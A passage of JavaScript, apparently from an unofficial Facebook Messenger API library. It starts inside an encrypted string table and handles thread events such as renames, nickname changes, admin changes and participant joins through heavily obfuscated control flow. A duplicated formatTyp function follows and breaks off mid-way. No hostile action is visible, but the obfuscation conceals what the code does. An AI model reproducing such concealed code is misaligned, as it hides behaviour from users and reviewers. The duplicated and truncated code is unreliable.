X%0EWQ@A/UX%19VQ@E_FAL%17%10%01%01SXX%19VQEE%5DFE@%5CQHLGK%13/%05,%03H%01%12$%03L8%118%1D%5CC%5D?J+(3+C-9%3C%5D%5EO%5B3+H0%1F%1B%1AYS%0B%06%13%15%14%05K%0B%17%17%04P%5D%5E%08ZFTWDP%5E%1FZFTQDEGJ%1B%07%15%15M$%01%1E%1CHYJ+.E+3WO:-%5EO%5B3+9J+%5E5-5+O:-(5%5B3+9:%5BTE+5+9%5EXE%16AXD%5CQ%5DE%01BXGUU@%5CTXX%0EVQ@B,UX%19VQ@E%5BCAM%06%13%15%14%05K%15%04%01%15%05%07%00P1%17)%12K%08%08%05%06%15%10%08%1F%1BN=%04%1E%10IY%0E%1C%15%1C%03%16%0FP$%09%22)%5EMJ96)4@_O4%1A%13%1CXA%5D%25%06#%0CFY%15%10%11%0F%13%01%07%1F%06V%0B%0F%1B%01FY%13%04%01%15%05%07%00P@%5EOI+%5E5+I%5D?%3C%5BTE+5+O:%5B.3-5+O:-%5C5%5B3+9HZ%5D%05%1F%18%06LHY%5CEXC-?J+.O%5B3+O@%5B.3-C-O:-(3%5B3+9:%5B.3-3%5DEJ+(3-A%0B%02%14%1E%16%1A%19%07%18D%0E8-%1AXA%0D%16%04%04%00%1C%1EH%19%1E#2%5DG%5B%0B5-%1BX%5CE%1B)1%1CIY%5E;%1A%0E%04LH%0D-=!%0F-%2584%02FY5K196%06U%16%1D%18%07%15%19%1A%00P9?%05%14X%1E+%22%1C_%1F%13%15%01%1B%02%06V!%03;%025%1B-$%10%3CK%08%08%05%06%15%10%08%1F%1BN=.#%10IY%0E%1C%15%1C%03%16%0FP%5D5-3%01%22/2%5DG-C-9H+$73%11%5EM%3C%0D%13%1B%1E%0B%02%0D%0E%1EU%092$%02LH%0B%07%0B%04%1D%04%0AAX.3+%03%110%16X%5C3XA%5D?%3CY.#*%20%03LH-%08%08%05%06%15%10%08%1F%1BN9+9%10IY%0E%1C%15%1C%03%16%0FP%5DE+3%5D?:%5B.3-C-O:-(3%5B3+9:%5B.3-3%5DEJ+(3-A%5DLI9%00%1D2@_MKX%5EF+C-?@%5B.3%5BI%5D?%3C-%5E5%5B3+9%3C-%5E5-A-O:-(GY%15%10%11%0F%13%01%07%1F%06V%07%186%01FY%13%04%01%15%05%07%00P@%01&*%06%5DGYC%5E-%22?%01FYA%0B%02%14%1E%16%1A%19%07%18D$%0A%3C%1AXA%0D%16%04%04%00%1C%1EH%5EOJ+%5E5-5-O:-(EXC%5D?J+(3+C-9%3CY%5CDXC%5D?J+(3+C-9%3C%5B%5DE%5B3%5D?%3C-.E+5+ML%5BTE+5_OI%5BTE+5%5DLJ%5B.E+5+?J+(3YA%0B%08%04%04U+$%1E%03_%07%05%1B%0D%04%01%19%0AA%17#%17%05@_%1F%13%15%01%1B%02%06VL(%113/XA_?$%02%18,XA+LH%0D%13%1B%1E%0B%02%0D%0E%1EU/!%18%03LH%0B%07%0B%04%1D%04%0AA=7$%08@_O,%18%22%19XA%5D%13%05=%0CFYC?+%0F%03%5DG%0D%0E%03%0A%02%04%1C%01%1EH%157%12%05%5DG%0B%1E%17%16A%07;%04%05U%5ESRFFWGXOAXYN%19%18%01%1A%01I%07;%04%05T%5ET%0EBE%5D@XBIWGE%5BDA_%17%16%19%01%0D%18@%01*%0B%05%5C%15%13%09%05%01AXE%01DXFTVGP%5E%08YFTPG%5CT%07&%1C%11%5CXE%16CXFP\'UE%01BXFTSC%5CU%0B%0B%19%0A%12%04U7?%05%03Y$$%03%1BM.%03%0A%02%04%1C%01%1E@%1D%0F%04%04%5D\'7:%0CLH%5C%1E%194%1A%5EMM%13:%06%09@_H4%1E%1C%16XA_MIYN7794LHK%19%0B%04H%05/%05%05H7?%05%03?$%02%00%1CXA%5D5%06*%04FY5M%12%00%02U;%3C%0F%03YI@%1A%5C@YATQ%5DE%16AXE&UYN%19%18%01%1A%01I%259%09%05T%5ET%0EFE%5EA%5DGAWE@XAA_%17%16%19%01%0D%18@#(%06%05%5C%15%13%09%05%01AXCYG%5B@IQ%1FG%5EDZFVHJ%20%22%17%1DKLPICYA%5BST%0EBE%5E@%5BGMZ%0B0:%06%1D-%17&#%0DFY5K=.%1D%0051!%22&IY%5E;%12%22%0FLH-N7?%05%03?,%00%1E%14XA+Y%0A%13%3C/K%15%14%16%04%11%1EU%13%09%05%01AXD%5DAYDVD@%1A%5C@XFVRYO;%3C%0F%03Y@%03%3E%0A%05W%5ET%0EDE%5E@%5EDAQ%08D%5E@X3M%5BXE%01DXFURBP%5E%08YFTP5%5CU%12%1A%13%05%0AK%08%13%12%1A%13%05%0AK%16%0F%03%0DVLQ?FZGXGTPAEH@%10BRR1B_4AL%13/%1A%00SQ-%22%12%14O%5D%5E%1F%5EFTPFDK@%10GTQBEGJ@F%0BS@D%5CB%5C%5BRWABZYS%14%16%04%11%1EU%0D%1A%13%10%14%02%1BN5%3C%00%11Z%0D%13%1B%1E%0B%02%0D%0E%1EU%19%1C%01%04LH%0B%07%0B%04%1D%04%0AAX0%149%1C%5EMH%5B%5D%01%1E%03%02LHY%08%08%05%06%15%10%08%1F%1BN)%05%1A%16IY%0E%1C%15%1C%03%16%0FPR2%05XFPRW%08%08%05%06%15%10%08%1F%1BN%03%01%15%16IY%0E%1C%15%1C%03%16%0FP%5DIW3%01%14%0D%08%5DG-@_M:%036&2@_9%1C%16%00%00%13%1C%1F%0B%0FP%20%04%16%1A%5EM%1A%02%10%1A%05%1A%18DI%04%0C%1E%15%07%10DI+(E+5_M:%5BTE+5%5DEJ+(EQC-9JQ%5E5-CWO:-(%13%1C%0D%02D%0E%16%22%1FM3T7%1D%1B=L%5CJ%03P%0D8WBR(%13%03C%5CW;%13%1A%04%0B%09%11WBR%09%15%16C%5CW8%04%0B%1D%0B%12%1BWBR%19G%0D)RYL%1B%0B%03%11%06%11%16%25%13%1A%11%06%06%02%12L%5CJ%04%0A%15%13%12%0C=%0B%09FMR%07%00%04%0B%11%06!%14:%0CRDT%0D%13%1E%16%1A#%1D%15%10!%14:%0CRDT%16%08%25%07%1A%1F%00%17FMR%1F%07%11T%04%0A%15%13%12%0C%5B%0D%1F%0E%08%04WBR%0B%1D%0D%0D%1FWBR%1A%18%07%0A%13,%0D%1B%01%1A%0BC%5CW%0B%19%02%1F%10C%5CW%1C%1E%0B%1D%078%15%1C%04%19%1CTHCV%1F%07%11T%04%0A%15%13%12%0C%5B%07%13%0D%09RYL%02%06%02%07%06%12,%01%15%01%1EFMR%1F%07%11T%05%11%02%04%5E%06%1F%0D%1B%0C%06%1B%16L%5CJ%1E%0B%04%1D%1D%09%1B%0B%03FMR%03%09%04%1A%19%01%0E%06%12%06%021%19%06C%5CW%06%1F%0D%1B%0C%06%1B%16L%5CJ%1C%07%09%11%07%00RDT%17%14%13%01!%18%08%1FFMR%15%01%18%0ATHC%1F%17L%5CJ%1E%03%0A%13WBR%02%1F%05%5D%02%1B%1A%13%0F%14O%06%12%1E%01%18%1DTHC77%25?%20/\'13=%3CRDT%03%03%12,%09%12%03%19%0CC%5CW%09%12%03%19%0C.2%00L%5CJ%00%17%14%1EWBR:10%203\'7?*THC%04%16%05%19%18%15=%06%12%1E%01%18JZF%01%1F%1F%1C%13%1CTHC%1A%1C%0FL%1A%18%10%02%17%17E%17%1E%00%10%08%00%12%04%5B%03%1F%06%02RYL%17%1E%00%10%08%00%12%04;%01%14%07C%5CW9%03%06%3EFMR%1F%07%11T%04%0A%15%13%12%0C%5B%00%11%0F%02RYL%02%06%02%07%06%12=%09%1B%0BTHC%1A%1C%0FL%1D%05%00%14%15%01%01%14%0BTHC%17%17%0C%13%0A%20%03%15%02%1A%0B%1F%1E%11%0C%13%05WBR%1D%1F%0F%02RYL%03%1D%15%10!%14:%0CRDT%04%12%1A%1F&%17%03%15FMR%14%0D%18%0A%15%10C%5CW%18%17%1C%04%0B%04%1F%03%09%18%1A9&%14RYL%1A%01%17X%12%18%00%1D%14%1D%13%10%0E%14%16L%5CJ%1C%07%01%02#%09%04%1A%19%01%0E%06%12%06%02(%12+%03R(U%16%1D%18%07%15%19%1A%00P9%11%3E%10X%5C%15%02%0D%02%11%13%1EU+4$%0CLH%5B%1E+:,%5EMJ10?%06@_O44%3E,XA%5D%07%18%081FYC;%14%12%00%5DG%5B%0B%0F%1C%25X%5CE!%03%15%1CIY%5E?%17:7LH%5B8%16%09*%5EMJ%25%1F%08%02@_O%205$%18XA%0B%02%14%1E%16%1A%19%07%18D%0A%13$%1FXA%0D%16%04%04%00%1C%1EH%1D-4%0A%5DG%5B!5#%25X%5CE%25,=&IY%5E/=%0D%0FLH%0D%13%1B%1E%0B%02%0D%0E%1EU#%14%3C%07LH%0B%07%0B%04%1D%04%0AAX.3+%1F0*#X%5C3%5B3+M:%1F%1B%05%04@_9%1C%16%00%00%13%1C%1F%0B%0FP8%167%1A%5EM%1A%02%10%1A%05%1A%18DI5%1F7%09@_M:%1B%20%1A%09@_9I%03%14)%09@_M%1C%16%00%00%13%1C%1F%0B%0FP%1A%14:%1A%5EM%1A%02%10%1A%05%1A%18DI+(5%1B%0F%22%13IY(FYC-9H+%1A%00%1B%1C%5EM%3C%0D%13%1B%1E%0B%02%0D%0E%1EU\'%05)%04LH%0B%07%0B%04%1D%04%0AA1%02%1B4@_O,%18%22%19XA%5D%0F%16%067FYC;6%15%03%5DG%5B)%117%18X%5C%13!)3&IYN%08%05%06%15%10%08%1F%1BN%1B%1F2%16IY%0E%1C%15%1C%03%16%0FP%5DE+5%5DEJ+(G%5B@%5EO@%5B.3%5BI%5D?%3CY_F%07%04%1F%16IY%5CG%0D%0E%03%0A%02%04%1C%01%1EH3%16%14%02%5DG%0B%1A%13%10%14%02%1BN5%06%1C%12IY%5E/59%00LH%5B%1E\'%25%12%5EMJ=%0D)%02@_O(32*XA%5D%07%18%081FY%15%10%11%0F%13%01%07%1F%06V%03%15%08%07FY%133%06*%07H5-S%15%0B%0F%03%01N1%07%19%16%5C9%3E%0D%07@__%02%1F%1B%1D%04H%15%15%13%02H%01(%12%0FLHK%16%01%1E%1B%02D%02;%10%1DM-%3E3%17X%5CU%13%07%18%17%15P0%22%18%1BK-%0C%1D%05FYS%15%0B%0F%03%01N)//%16%5C9%00/%02@__%17%11%07N1!%14%17%5CXE%01BXCUUDX%5E%08YF%25R5%5CU%0B%04%13%10A%251=%02S%01%0C%08%1C%10F1!%14%17%5DXE%01AXFTSFBKF%5DCSSY%5C%15%03%1F%1F%10%02%18%5D/9%0A%05M%1A%13%14%1D%15H%5ERWHDX%5DX%19VQBFZ@AL%25(%12%06SXX%19VQ@FYBEF%1CP@E+AAM1%25#%07E%5BS%14%16%04%11%1EU%13%09%05%01AXE%01FXFUSEPXE%5DCRHJ4\'%12%1BK1%25#%07R%1F%0E!%15:59%06%035ILQ%1FD%5E@XDUQUE%16AXFUXYOF@%07@TQBFYU%5ECQVF%5CU%12%1A%13%05%0AK%16%0F%03%0DVLQ%1FC%5E@YCTD@%0D_@XGRHJ4\'%12%1BKLWGE%5DFEF%0BS@GY@%5B__44&%1CM@F%1CSABVFMEMZ%12%07%0B%11%03M%07%00%03%10NXX%19VQ@@%5B@E@QYFEGJ)?%06%12M%5D%5E%08YFW%22@X%5E%1FZFUWDEGK%13%1A%01%15P%02(&%1AKFCK%16%01%1E%1B%02D018%1CM%07%103%10+%20*#%1A+_%17%11%07N%03+&%16%5CXE%01BXCRS@XXH%5CC%5DHK%0E%02%15%1CV%1763%06U%07%00%1F%08%04X%06-%20%1AJLQ%08G%5E@%5C3AQ%1FG%5E@XDPHY%0E%1D%07%01%02%07%09X%06-%20%1A_%1F%02%11%06%0BP@@%5DXGCC@%07DUQDC%5DYR%05\'1%02HF@%10DTQD3K@%07DTQ@FZYS%053%22%03HF@%10AQ%03%13%11_EEF+VBCYD%5EBVTYN%0C%02%0D%17%0FZ%13%14%1D%15H%5ERTHDX%5DX%19VQ@A_BAL%17%22%20%07SXX9WUGE_@YGTG@%0DZF%5B7SP4%5CU%0B%1F02%13%5BH/%1F%07%04?%02%01%07%1C-@\'%25,%02.%0D;%0D%059I%03%22-%03A(LVB@%5BI%5ENSG@:%5DAZGUPBCXYAM%19%03%02%10%0F%1BS%15%05%12%15UF@\'EUTCE%5B@%5D@WL@%0D_I)5QPF7GJ%1B54%13M%5D%5E%1FYFTQBEYUX%0EUQ@D-YS%053%22%03%5EEK%0A%04%01%00%1BN%0D%11%1B%13DIFC%5CB%5E%5BT%0EBE_B%5BEM%5B%036%3E%02U%053%22%03I?1%25%04?$%3C%1D%1D-W%5ET%0EBE%5EBYBIQ%08D%5E@_3M%5BXE%01BXCSU@X%5E%08YF&#1%5CU%12%1A%13%05%0AK%08%13%0D-%14/%16+,))%1A+L%166#%1CYS%0B%06%13%15%14%05K%15%0B%19%1C%16%00%00%13%1C%1F%0B%0FP%2066%1B%5E%0B5%07%06G%0B%1A%13%10%14%02%1BN5%0A=%13:%1F!%19%035M%19%07%05%1B%0D%04%01%19%0AA!%20%14%03@_%1F%13%15%01%1B%02%06V%17%0C%16%0DFYC%15%0D%05%00%5DG%5B9%05%15%1BX%5CE1-\'%12IY%08%08%05%06%15%10%08%1F%1BN%1B9%07%17IY%0E%1C%15%1C%03%16%0FP%5D%0D%09%102LHY.+%02%054LH-%5DG%0D%0F%02%1C%13X%5CU%16%1D%18%07%15%19%1A%00P%25$%10%12X%5C%15%13%07%18%17%15P%12%20%1B%1BK%072%03%00FY3%15%15%0B2%5DG-S%04%01%15%05%07%00P%0F8%0F%12O%5D%09%3E%03%05O:-%5C5)?7%13D%1B%1A%06%0A@_9%5B%1F%17%22%05@%11*%0A%03%5E5-D%15+%09%09%5DGYS%0B%02%14%1E%16%1A%19%07%18D(?%1B%1DXA%0D%16%04%04%00%1C%1EH%5E?%3C+%02(%3E*%5EM%3C%5B.3Y3%5DEJ+(EQC-9JQ%5E5-5%0B%02%14%1E%16%1A%19%07%18D%0A%1F%05%1EXA%0D%16%04%04%00%1C%1EH%5EO:-%5EO%5B3+MJX%5D\'%05%1B4LHY_F%5B@-O:+TE+5%5DEJ+(3%5B3%5D?%3C-(3%5B3+M:%5B.5%5B3-O:-(E+C-9%3C-%5E5-5-O:-(5%5BI%5D?%3C-(3YA%0B%02%14%1E%16%1A%19%07%18D,%00%06%1EXA%0D%16%04%04%00%1C%1EH%5E%0F%16%067FYA-!%13%1D7FY5%5EM%1C%16%00%00%13%1C%1F%0B%0FP%12%02%1A%18%5EM%1A%02%10%1A%05%1A%18DI!%12%3C1@_M:5%07%032@_9IY%08%08%05%06%15%10%08%1F%1BN9%05%1B%14IY%0E%1C%15%1C%03%16%0FP%20%08%25%1D%5EMJ10?%06@_O44%3E,XA%5D1%0B%16%07FYC%15%1D%194%5DG%5B%25$%10%12X%5CE1%0F%25%1DIY%08%08%05%06%15%10%08%1F%1BN%13%01%12%14IY%0E%1C%15%1C%03%16%0FP%5D%09%1C%0A%0CLHY.+%02%054LH-%5DG%0D-&%0F%18X%5CU%16%1D%18%07%15%19%1A%00P-%1C%03%11X%5C%15%02%0D%02%11%13%1EUF%5BC-O:-(5%5B3+9JX%5EE+C-9%3C+%5E5-5_IJQ%5E5-A%5DLJQ%5E5-C%5EOJ+%5E5-5-O:-(GYC%5EOI+%5E5+I%5D?%3C%5BTE+5+O:%5B.3-5+O:-%5C5%5B3-O:+%5E5-5%5D?J+(3-C-9%3C+%5E5-5-O@%5B.3-5+M%1C%16%00%00%13%1C%1F%0B%0FP,%0B(%07%5EM%1A%02%10%1A%05%1A%18D,2?%16XA%5D%17%14%04%0FFYC7)%04%09%5DG%5B)%117%18X%5CE!%0F$%25IY%5E\'3/2LH%5B%20%04%16%1A%5EMJ1%12=%09@_%19%07%05%1B%0D%04%01%19%0AA1%12%0F%00@_%1F%13%15%01%1B%02%06V-.%1E%06FYC7%032%09%5DG%0D0%255%06%5E%1A:%11%25K%02%14%1E%16%1A%19%07%18LH%0B%07%0B%04%1D%04%0AACG%13K0%255%06%5E%3C%09C$K%02%14%1E%16%1A%19%07%18LH%0B%07%0B%04%1D%04%0AAAG%13K0%255%06%5E%1E!E$K%02%14%1E%16%1A%19%07%18LH%0B%07%0B%04%1D%04%0AABG%13K0%255%06%5E0%0C)$K%02%14%1E%16%1A%19%07%18LH%0B%07%0B%04%1D%04%0AABL%13K0%255%06%5E%12$@$K%02%14%1E%16%1A%19%07%18LH%0B%07%0B%04%1D%04%0AACF%13K0%255%06%5E4X#$K%02%14%1E%16%1A%19%07%18LH%0B%07%0B%04%1D%04%0AACA%13K0%255%06%5E0%5D%20%22K%02%14%1E%16%1A%19%07%18LH%0B%07%0B%04%1D%04%0AABB%13K0%255%06%5E%12,#%22K%02%14%1E%16%1A%19%07%18LH%0B%07%0B%04%1D%04%0AAAE%13K0%255%06%5E47;%22K%02%14%1E%16%1A%19%07%18LH%0B%07%0B%04%1D%04%0AACL%13K0%255%06%5E%16%19%3E%22K%02%14%1E%16%1A%19%07%18LH%0B%07%0B%04%1D%04%0AADE%13K0%255%06%5E,%1F9%22K%02%14%1E%16%1A%19%07%18LH%0B%07%0B%04%1D%04%0AABC%13K0%255%06%5E%06!1%22K%02%14%1E%16%1A%19%07%18LH%0B%07%0B%04%1D%04%0AAC@%13K0%255%06%5E$%07E%22K%02%14%1E%16%1A%19%07%18LH%0B%07%0B%04%1D%04%0AACM%13K0%255%06%5E8%0A@%22K%02%14%1E%16%1A%19%07%18LH%0B%07%0B%04%1D%04%0AAH%08U(;\'%03O%1F9%5C:U%10%11%0F%13%01%07%1F%06%5EM%1A%02%10%1A%05%1A%18DPG%08U(;\'%03O9M;:U%10%11%0F%13%01%07%1F%06%5EM%1A%02%10%1A%05%1A%18DPF%08U(;\'%03O%1B26:U%10%11%0F%13%01%07%1F%06%5EM%1A%02%10%1A%05%1A%18DSA%08U(;\'%03O%1B%3C%1B;U%10%11%0F%13%01%07%1F%06%5EM%1A%02%10%1A%05%1A%18DSH%08U(;\'%03O%171%1E;U%10%11%0F%13%01%07%1F%06%5EM%1A%02%10%1A%05%1A%18DRF%08U(;\'%03O9%14%1D;U%10%11%0F%13%01%07%1F%06%5EM%1A%02%10%1A%05%1A%18DRG%08U(;\'%03O5@%03;U%10%11%0F%13%01%07%1F%06%5EM%1A%02%10%1A%05%1A%18DSC%08U(;\'%03O1E%06;U%10%11%0F%13%01%07%1F%06%5EM%1A%02%10%1A%05%1A%18DR@%08U(;\'%03O1G!;U%10%11%0F%13%01%07%1F%06%5EM%1A%02%10%1A%05%1A%18DRA%08U(;\'%03O%07-$;U%10%11%0F%13%01%07%1F%06%5EM%1A%02%10%1A%05%1A%18DSE%08U(;\'%03O%03&+;U%10%11%0F%13%01%07%1F%06%5EM%1A%02%10%1A%05%1A%18DPD%08U(;\'%03O)%1646U%10%11%0F%13%01%07%1F%06%5EM%1A%02%10%1A%05%1A%18DPI%08U(;\'%03O%13%1E,7U%10%11%0F%13%01%07%1F%06%5EM%1A%02%10%1A%05%1A%18DS@%08U(;\'%03O%07=%1A7U%10%11%0F%13%01%07%1F%06%5EM%1A%02%10%1A%05%1A%18DV%0DN6#9%11J4I%04)M%0E%03%0A%02%04%1C%01%1E@_%1F%13%15%01%1B%02%06VVU%0D%08G\")")
}();
var AANp = XSQg[XSQg.TD6d(0)]();
while (AANp < XSQg[XSQg.r8Ae(1)]()) switch (AANp) {
    case (0x21786 % 3):
        AANp = global[XSQg.jYqe(2)][XSQg.fVSe(3)][XSQg.bSkf(4)](XSQg.XMff(5)) == !![] ? XSQg[XSQg.PuXc(6)]() : XSQg[XSQg.r8Ae(1)]();
        break;
    case (0O57060516 - 0xbc614d):
        AANp = XSQg[XSQg.r8Ae(1)](); {
            switch (hasData(formatID((m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.r8Ae(9)] || m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.jYqe(10)])[XSQg.fVSe(11)]()))) {
                case !![]: {
                    switch (logMessageType) {
                        case XSQg.bSkf(12): {
                            let cCQp = getData(formatID((m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.r8Ae(9)] || m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.jYqe(10)])[XSQg.fVSe(11)]()));
                            cCQp[XSQg.XMff(13)] = (logMessageData[XSQg.PuXc(14)] || cCQp[XSQg.XMff(13)]);
                            cCQp[XSQg.jSPc(15)] = (logMessageData[XSQg.TD6d(16)] || cCQp[XSQg.jSPc(15)]);
                            updateData(formatID((m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.r8Ae(9)] || m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.jYqe(10)])[XSQg.fVSe(11)]()), cCQp);
                        }
                        break;
                        case XSQg.r8Ae(17): {
                            let wxHp = getData(formatID((m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.r8Ae(9)] || m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.jYqe(10)])[XSQg.fVSe(11)]()));
                            wxHp[XSQg.XMff(13)] = (logMessageData[XSQg.jYqe(18)] || wxHp[XSQg.XMff(13)]);
                            updateData(formatID((m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.r8Ae(9)] || m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.jYqe(10)])[XSQg.fVSe(11)]()), wxHp);
                        }
                        break;
                        case XSQg.fVSe(19): {
                            let YyKp = getData(formatID((m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.r8Ae(9)] || m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.jYqe(10)])[XSQg.fVSe(11)]()));
                            YyKp[XSQg.bSkf(20)][logMessageData[XSQg.XMff(21)]] = (logMessageData[XSQg.PuXc(22)][XSQg.jSPc(23)] == (0x75bcd15 - 0O726746425) ? YyKp[XSQg.TD6d(24)][XSQg.r8Ae(25)](suBp => suBp[XSQg.jYqe(26)] == String(logMessageData[XSQg.XMff(21)]))[XSQg.fVSe(27)] : logMessageData[XSQg.PuXc(22)]);
                            updateData(formatID((m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.r8Ae(9)] || m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.jYqe(10)])[XSQg.fVSe(11)]()), YyKp);
                        }
                        break;
                        case XSQg.bSkf(28): {
                            let UvEp = getData(formatID((m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.r8Ae(9)] || m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.jYqe(10)])[XSQg.fVSe(11)]()));
                            switch (logMessageData[XSQg.XMff(29)]) {
                                case XSQg.PuXc(30): {
                                    UvEp[XSQg.jSPc(31)][XSQg.TD6d(32)]({
                                        [XSQg.jYqe(26)]: logMessageData[XSQg.r8Ae(33)]
                                    });
                                }
                                break;
                                case XSQg.jYqe(34): {
                                    UvEp[XSQg.jSPc(31)] = UvEp[XSQg.jSPc(31)][XSQg.fVSe(35)](orvp => orvp[XSQg.jYqe(26)] != logMessageData[XSQg.r8Ae(33)]);
                                }
                                break;
                            }
                            updateData(formatID((m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.r8Ae(9)] || m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.jYqe(10)])[XSQg.fVSe(11)]()), UvEp);
                        }
                        break;
                        case XSQg.bSkf(36): {
                            let Qsyp = getData(formatID((m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.r8Ae(9)] || m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.jYqe(10)])[XSQg.fVSe(11)]()));
                            var QMlq = XSQg[XSQg.TD6d(0)]();
                            while (QMlq < XSQg[XSQg.r8Ae(1)]()) switch (QMlq) {
                                case (0x75bcd15 - 0O726746425):
                                    QMlq = Qsyp[XSQg.XMff(37)] == !![] ? XSQg[XSQg.PuXc(6)]() : XSQg[XSQg.PuXc(38)]();
                                    break;
                                case (0O57060516 - 0xbc614d):
                                    QMlq = XSQg[XSQg.r8Ae(1)](); {
                                        Qsyp[XSQg.XMff(37)] = (NaN === NaN);
                                    }
                                    break;
                                case (0x2935494a % 7):
                                    QMlq = XSQg[XSQg.r8Ae(1)](); {
                                        Qsyp[XSQg.XMff(37)] = !![];
                                    }
                                    break;
                            }
                            updateData(formatID((m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.r8Ae(9)] || m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.jYqe(10)])[XSQg.fVSe(11)]()), Qsyp);
                        }
                        break;
                        case XSQg.jSPc(39): {
                            let sOoq = getData(formatID((m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.r8Ae(9)] || m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.jYqe(10)])[XSQg.fVSe(11)]()));
                            sOoq[XSQg.TD6d(40)] = (logMessageData[XSQg.fVSe(27)] || formatID((m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.r8Ae(9)] || m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.jYqe(10)])[XSQg.fVSe(11)]()));
                            updateData(formatID((m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.r8Ae(9)] || m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.jYqe(10)])[XSQg.fVSe(11)]()), sOoq);
                        }
                        break;
                        case XSQg.r8Ae(41): {
                            let MJfq = getData(formatID((m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.r8Ae(9)] || m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.jYqe(10)])[XSQg.fVSe(11)]()));
                            ICGD: for (let oLiq of logMessageData[XSQg.jYqe(42)]) {
                                var IGZp = XSQg[XSQg.TD6d(0)]();
                                while (IGZp < XSQg[XSQg.r8Ae(1)]()) switch (IGZp) {
                                    case (0x21786 % 3):
                                        IGZp = MJfq[XSQg.TD6d(24)][XSQg.fVSe(43)](kIcq => kIcq[XSQg.jYqe(26)] == oLiq[XSQg.bSkf(44)]) ? XSQg[XSQg.PuXc(6)]() : XSQg[XSQg.PuXc(38)]();
                                        break;
                                    case (0O12130251 % 3):
                                        IGZp = XSQg[XSQg.r8Ae(1)]();
                                        continue ICGD;
                                    case (0x2935494a % 7):
                                        IGZp = XSQg[XSQg.r8Ae(1)](); {
                                            MJfq[XSQg.TD6d(24)][XSQg.TD6d(32)]({
                                                [XSQg.jYqe(26)]: oLiq[XSQg.bSkf(44)],
                                                [XSQg.fVSe(27)]: oLiq[XSQg.XMff(45)],
                                                [XSQg.PuXc(46)]: getGenderByPhysicalMethod(oLiq[XSQg.XMff(45)])
                                            });
                                            MJfq[XSQg.jSPc(47)][XSQg.TD6d(32)](oLiq[XSQg.bSkf(44)]);
                                        }
                                        break;
                                }
                            }
                            updateData(formatID((m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.r8Ae(9)] || m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.jYqe(10)])[XSQg.fVSe(11)]()), MJfq);
                        }
                        break;
                        case XSQg.TD6d(48): {
                            let EDTp = getData(formatID((m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.r8Ae(9)] || m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.jYqe(10)])[XSQg.fVSe(11)]()));
                            EDTp[XSQg.jSPc(47)] = EDTp[XSQg.jSPc(47)][XSQg.fVSe(35)](gFWp => gFWp != logMessageData[XSQg.r8Ae(49)]);
                            EDTp[XSQg.TD6d(24)] = EDTp[XSQg.TD6d(24)][XSQg.fVSe(35)](gZJq => gZJq[XSQg.jYqe(26)] != logMessageData[XSQg.r8Ae(49)]);
                            var IaNq = XSQg[XSQg.TD6d(0)]();
                            while (IaNq < XSQg[XSQg.r8Ae(1)]()) switch (IaNq) {
                                case (0x75bcd15 - 0O726746425):
                                    IaNq = EDTp[XSQg.jSPc(31)][XSQg.fVSe(43)](cWDq => cWDq[XSQg.jYqe(26)] == logMessageData[XSQg.r8Ae(49)]) ? XSQg[XSQg.PuXc(6)]() : XSQg[XSQg.r8Ae(1)]();
                                    break;
                                case (0O57060516 - 0xbc614d):
                                    IaNq = XSQg[XSQg.r8Ae(1)](); {
                                        EDTp[XSQg.jSPc(31)] = EDTp[XSQg.jSPc(31)][XSQg.fVSe(35)](EXGq => EXGq[XSQg.jYqe(26)] != logMessageData[XSQg.r8Ae(49)]);
                                    }
                                    break;
                            }
                            updateData(formatID((m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.r8Ae(9)] || m[XSQg.jSPc(7)][XSQg.TD6d(8)][XSQg.jYqe(10)])[XSQg.fVSe(11)]()), EDTp);
                        }
                        break;
                    }
                }
            }
        }
    break;
}

return {
    type: "event",
    threadID: formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),
    logMessageType: logMessageType,
    logMessageData: logMessageData,
    logMessageBody: m.messageMetadata.adminText,
    author: m.messageMetadata.actorFbId,
    participantIDs: m.participants || []
    };  
}

function formatTyp(event) {
  return {
      isTyping: !!event.st,
      from: event.from.toString(),
      threadID: formatID((event.to || event.thread_fbid || event.from).toString()),
      // When receiving typ indication from mobile, `from_mobile` isn't set.
      // If it is, we just use that value.
      fromMobile: event.hasOwnProperty("from_mobile") ? event.from_mobile : true,
      userID: (event.realtime_viewer_fbid || event.from).toString(),
      type: "typ"
  };
}

function formatTyp(event) {
    return {
        isTyping: !!event.st,
        from: event.from.toString(),
        threadID: formatID((event.to || event.thread_fbid || event.from).toString()),
        // When receiving typ indication from mobile, `from_mobile` isn't set.
        // If it is, we just use that value.
        fromMobile: event.hasOwnProperty("from_mobile") ? event.from_mobile : true,
        userID: (event.realtime_viewer_fbid || event.from).toString(),
